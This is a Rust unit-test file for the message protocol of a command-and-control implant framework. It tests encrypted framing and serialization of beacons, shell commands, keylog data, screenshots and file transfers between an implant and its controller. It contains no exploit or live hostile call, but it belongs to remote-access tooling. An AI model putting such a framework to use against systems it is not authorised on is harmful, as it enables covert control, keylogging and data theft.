use super::*;

fn sample_beacon() -> BeaconMessage {
    BeaconMessage {
        implant_id: "impl-001".to_string(),
        timestamp: 1700000000,
        hostname: "target-box".to_string(),
        username: "root".to_string(),
        os: "Linux 6.1".to_string(),
        ip: "10.0.0.42".to_string(),
        payload_type: PayloadType::Checkin,
        data: b"alive".to_vec(),
    }
}

fn sample_command() -> CommandMessage {
    CommandMessage {
        command_id: "cmd-001".to_string(),
        implant_id: "impl-001".to_string(),
        command_type: CommandType::Shell,
        args: vec!["whoami".to_string()],
        timeout_secs: 30,
    }
}

fn sample_response() -> ResponseMessage {
    ResponseMessage {
        command_id: "cmd-001".to_string(),
        status: CommandStatus::Success,
        output: b"root\n".to_vec(),
        error: None,
    }
}

#[test]
fn test_payload_type_display() {
    assert_eq!(PayloadType::Checkin.to_string(), "Checkin");
    assert_eq!(PayloadType::KeylogData.to_string(), "KeylogData");
    assert_eq!(PayloadType::ShellOutput.to_string(), "ShellOutput");
    assert_eq!(PayloadType::Screenshot.to_string(), "Screenshot");
    assert_eq!(PayloadType::FileUpload.to_string(), "FileUpload");
    assert_eq!(PayloadType::CommandResult.to_string(), "CommandResult");
}

#[test]
fn test_command_type_display() {
    assert_eq!(CommandType::Shell.to_string(), "Shell");
    assert_eq!(CommandType::Die.to_string(), "Die");
    assert_eq!(CommandType::Config.to_string(), "Config");
    assert_eq!(CommandType::Download.to_string(), "Download");
    assert_eq!(CommandType::Upload.to_string(), "Upload");
    assert_eq!(CommandType::Screenshot.to_string(), "Screenshot");
    assert_eq!(CommandType::Keylog.to_string(), "Keylog");
    assert_eq!(CommandType::Sleep.to_string(), "Sleep");
}

#[test]
fn test_serialize_deserialize_beacon() {
    let beacon = sample_beacon();
    let msg = C2Message::Beacon(beacon);
    let bytes = serialize_message(&msg).expect("serialize");
    let decoded = deserialize_message(&bytes).expect("deserialize");
    match decoded {
        C2Message::Beacon(b) => {
            assert_eq!(b.implant_id, "impl-001");
            assert_eq!(b.hostname, "target-box");
            assert_eq!(b.payload_type, PayloadType::Checkin);
            assert_eq!(b.data, b"alive");
        }
        _ => panic!("expected Beacon variant"),
    }
}

#[test]
fn test_serialize_deserialize_command() {
    let cmd = sample_command();
    let msg = C2Message::Command(cmd);
    let bytes = serialize_message(&msg).expect("serialize");
    let decoded = deserialize_message(&bytes).expect("deserialize");
    match decoded {
        C2Message::Command(c) => {
            assert_eq!(c.command_id, "cmd-001");
            assert_eq!(c.command_type, CommandType::Shell);
            assert_eq!(c.args, vec!["whoami"]);
        }
        _ => panic!("expected Command variant"),
    }
}

#[test]
fn test_serialize_deserialize_response() {
    let resp = sample_response();
    let msg = C2Message::Response(resp);
    let bytes = serialize_message(&msg).expect("serialize");
    let decoded = deserialize_message(&bytes).expect("deserialize");
    match decoded {
        C2Message::Response(r) => {
            assert_eq!(r.command_id, "cmd-001");
            assert_eq!(r.status, CommandStatus::Success);
            assert_eq!(r.output, b"root\n");
            assert!(r.error.is_none());
        }
        _ => panic!("expected Response variant"),
    }
}

#[test]
fn test_session_cipher_encrypt_decrypt() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let plaintext = b"secret beacon data with unicode \xc3\xa9";
    let encrypted = cipher.encrypt(plaintext).expect("encrypt");
    assert_ne!(&encrypted[..], plaintext);
    assert!(encrypted.len() > plaintext.len());
    let decrypted = cipher.decrypt(&encrypted).expect("decrypt");
    assert_eq!(decrypted, plaintext);
}

#[test]
fn test_session_cipher_wrong_key_fails() {
    let key1 = SessionCipher::generate_key();
    let key2 = SessionCipher::generate_key();
    let cipher1 = SessionCipher::new(&key1);
    let cipher2 = SessionCipher::new(&key2);
    let encrypted = cipher1.encrypt(b"test data").expect("encrypt");
    let result = cipher2.decrypt(&encrypted);
    assert!(result.is_err());
}

#[test]
fn test_session_cipher_decrypt_too_short() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let result = cipher.decrypt(&[0u8; 4]);
    assert!(result.is_err());
}

#[test]
fn test_encode_decode_frame_beacon() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Beacon(sample_beacon());
    let frame = encode_frame(&msg, &cipher).expect("encode");
    assert!(frame.len() > 4);
    let len = u32::from_be_bytes([frame[0], frame[1], frame[2], frame[3]]) as usize;
    assert_eq!(frame.len(), 4 + len);
    let (decoded, consumed) = decode_frame(&frame, &cipher).expect("decode");
    assert_eq!(consumed, frame.len());
    match decoded {
        C2Message::Beacon(b) => {
            assert_eq!(b.implant_id, "impl-001");
            assert_eq!(b.username, "root");
        }
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_encode_decode_frame_command() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Command(sample_command());
    let frame = encode_frame(&msg, &cipher).expect("encode");
    let (decoded, _) = decode_frame(&frame, &cipher).expect("decode");
    match decoded {
        C2Message::Command(c) => {
            assert_eq!(c.command_type, CommandType::Shell);
            assert_eq!(c.timeout_secs, 30);
        }
        _ => panic!("expected Command"),
    }
}

#[test]
fn test_encode_decode_frame_response() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg = C2Message::Response(sample_response());
    let frame = encode_frame(&msg, &cipher).expect("encode");
    let (decoded, _) = decode_frame(&frame, &cipher).expect("decode");
    match decoded {
        C2Message::Response(r) => {
            assert_eq!(r.status, CommandStatus::Success);
        }
        _ => panic!("expected Response"),
    }
}

#[test]
fn test_decode_frame_too_short() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let result = decode_frame(&[0, 0, 0], &cipher);
    assert!(result.is_err());
}

#[test]
fn test_decode_frame_length_exceeds_data() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let frame = vec![0, 0, 0, 100, 0, 0];
    let result = decode_frame(&frame, &cipher);
    assert!(result.is_err());
}

#[test]
fn test_multiple_frames_concatenated() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let msg1 = C2Message::Beacon(sample_beacon());
    let msg2 = C2Message::Command(sample_command());
    let frame1 = encode_frame(&msg1, &cipher).expect("encode1");
    let frame2 = encode_frame(&msg2, &cipher).expect("encode2");
    let mut combined = frame1.clone();
    combined.extend_from_slice(&frame2);
    let (decoded1, consumed1) = decode_frame(&combined, &cipher).expect("decode1");
    assert!(matches!(decoded1, C2Message::Beacon(_)));
    let (decoded2, consumed2) = decode_frame(&combined[consumed1..], &cipher).expect("decode2");
    assert!(matches!(decoded2, C2Message::Command(_)));
    assert_eq!(consumed1 + consumed2, combined.len());
}

#[test]
fn test_large_payload_roundtrip() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let large_data = vec![0xAB_u8; 65536];
    let beacon = BeaconMessage {
        implant_id: "impl-big".to_string(),
        timestamp: 1700000001,
        hostname: "bigbox".to_string(),
        username: "admin".to_string(),
        os: "Windows 11".to_string(),
        ip: "192.168.1.100".to_string(),
        payload_type: PayloadType::FileUpload,
        data: large_data.clone(),
    };
    let msg = C2Message::Beacon(beacon);
    let frame = encode_frame(&msg, &cipher).expect("encode");
    let (decoded, _) = decode_frame(&frame, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => {
            assert_eq!(b.data.len(), 65536);
            assert_eq!(b.data, large_data);
        }
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_empty_data_beacon() {
    let key = SessionCipher::generate_key();
    let cipher = SessionCipher::new(&key);
    let beacon = BeaconMessage {
        implant_id: "impl-empty".to_string(),
        timestamp: 0,
        hostname: String::new(),
        username: String::new(),
        os: String::new(),
        ip: String::new(),
        payload_type: PayloadType::Checkin,
        data: vec![],
    };
    let msg = C2Message::Beacon(beacon);
    let frame = encode_frame(&msg, &cipher).expect("encode");
    let (decoded, _) = decode_frame(&frame, &cipher).expect("decode");
    match decoded {
        C2Message::Beacon(b) => {
            assert!(b.data.is_empty());
            assert_eq!(b.implant_id, "impl-empty");
        }
        _ => panic!("expected Beacon"),
    }
}

#[test]
fn test_error_response_roundtrip() {
    let resp = ResponseMessage {
        command_id: "cmd-err".to_string(),
        status: CommandStatus::Failed,
        output: vec![],
        error: Some("permission denied".to_string()),
    };
    let msg = C2Message::Response(resp);
    let bytes = serialize_message(&msg).expect("serialize");
    let decoded = deserialize_message(&bytes).expect("deserialize");
    match decoded {
        C2Message::Response(r) => {
            assert_eq!(r.status, CommandStatus::Failed);
            assert_eq!(r.error.as_deref(), Some("permission denied"));
        }
        _ => panic!("expected Response"),
    }
}

#[test]
fn test_c2_protocol_error_display() {
    let e1 = C2ProtocolError::SerializationFailed("oops".to_string());
    assert!(e1.to_string().contains("serialization failed"));
    let e2 = C2ProtocolError::DecryptionFailed;
    assert!(e2.to_string().contains("decryption failed"));
    let e3 = C2ProtocolError::FrameTooShort;
    assert!(e3.to_string().contains("frame too short"));
}

#[test]
fn test_generate_key_uniqueness() {
    let k1 = SessionCipher::generate_key();
    let k2 = SessionCipher::generate_key();
    assert_ne!(k1, k2);
}
